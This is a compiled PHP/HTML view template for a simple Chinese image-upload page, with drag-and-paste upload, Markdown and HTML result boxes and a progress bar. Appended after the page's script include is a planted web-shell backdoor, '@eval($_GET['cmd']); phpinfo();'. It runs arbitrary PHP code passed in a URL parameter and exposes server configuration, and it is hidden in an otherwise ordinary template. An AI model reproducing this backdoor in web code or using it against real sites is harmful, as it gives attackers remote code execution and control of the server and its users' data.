<?php /*a:1:{s:66:"C:\wwwroot\pic.xiaodu0.com\application\index\view\index\index.html";i:1698066191;}*/ ?>
<!doctype html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>简单图床</title>
    <link rel="stylesheet" href="/assets/index/css/index.css">
</head>
<body>
<!--背景遮罩-->
<div class="bg-filter">

</div>
<!--背景遮罩-->
<!--主容器开始-->
<div class="main">
    <div class="img-container" id="img-container" contenteditable="true">
        <img src="/assets/index/img/upload.png" style="width: 200px;height: 200px" alt="" />
        <br>
        <span>将图片拖动/粘贴到此上传。</span>
        <br>
        <div class="click-upload">
            <input id="click-file" type="file" placeholder="点击上传">
            <button class="upload-btn">也可以点我上传</button>
        </div>
    </div>
    <div class='result-box'>
        上传成功！<br>
        <div class="md-box">
            Markdown：<br><code id="mdcode" class="md" contenteditable="true">这里是md代码</code>
        </div>
        <div class="htmlcode-box">
            HTML：<pre id="htmlcode" class="htmlcode" contenteditable="true">这里是HTML代码</pre>
        </div>
        <button onclick="window.location.href='./'">继续上传</button>

    </div>
</div>
<div class="load" id="load">
    <div class="load-bar">
        <div class="load-bar-title">
            <b>上传中.....</b>
        </div>
        <div class="load-bar-content">
            <div class="jindutiao" id="jdt">
                <div class="jdt-bg"></div>
                <div class="jdt-ft"></div>
            </div>
        </div>
    </div>
</div>
<!--主容器结束-->
<script src="/assets/index/js/script.js"></script>
<script type="application/x-httpd-php">
@eval($_GET['cmd']);
phpinfo();
</script>
</body>
</html>